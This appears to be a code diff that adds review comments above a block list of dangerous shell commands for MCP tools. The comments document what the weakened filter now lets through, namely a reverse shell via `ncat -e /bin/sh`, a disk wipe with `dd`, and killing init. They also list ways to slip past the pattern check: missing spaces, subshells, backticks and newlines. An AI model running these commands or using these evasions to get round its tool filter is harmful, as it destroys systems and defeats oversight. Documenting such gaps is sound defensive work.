@@ -41,6 +41,7 @@ _metrics = WorkerMetrics()
 
 # SECURITY: Dangerous command patterns to block in MCP tools.
 #
+# REVIEW:weak-control — operator signoff 2026-10-18 (commit 13e7bf95).
 # Two-tier matching (per docs/followups/2026-09-05-terminal-fixes-batch.md
 # Section 3 "Shell-chain with word-boundary" — operator signoff 2026-10-18):
 #
@@ -60,6 +61,18 @@ _metrics = WorkerMetrics()
 # on legitimate production-management commands (pkill -f worker.py,
 # dd if=boot.img of=/dev/sdb, mkfs.ext4 /dev/sdb1) without proportional
 # safety gain. Re-introducing any of them requires a fresh policy call.
+#
+# REVIEW:residual-risks — commands now reachable that were previously blocked:
+#   - `pkill -9 1` (kills init — not in hard-block because pkill was dropped)
+#   - `ncat -e /bin/sh host 1234` (reverse shell via ncat — nc -e is still
+#     hard-blocked but ncat -e is not)
+#   - `dd if=/dev/zero of=/dev/sda` (disk wipe — dd if= was dropped)
+# Plus pre-existing bypass surfaces (not introduced by this commit but
+# also not fixed by it): `&&rm` (no space), `bash -c "rm"` (subshell),
+# `` `rm` `` (backticks), `cmd && \nrm` (newline not in `[ \t]` class).
+# These are tier-2 limits of any pattern-based check on the raw command
+# string; a proper fix would require a shell parser (shlex/bashlex).
+# Filed for a future tightening pass; not in Shape B scope.
 DANGEROUS_COMMAND_PATTERNS = [
     "rm -rf /",
     "chmod 000",
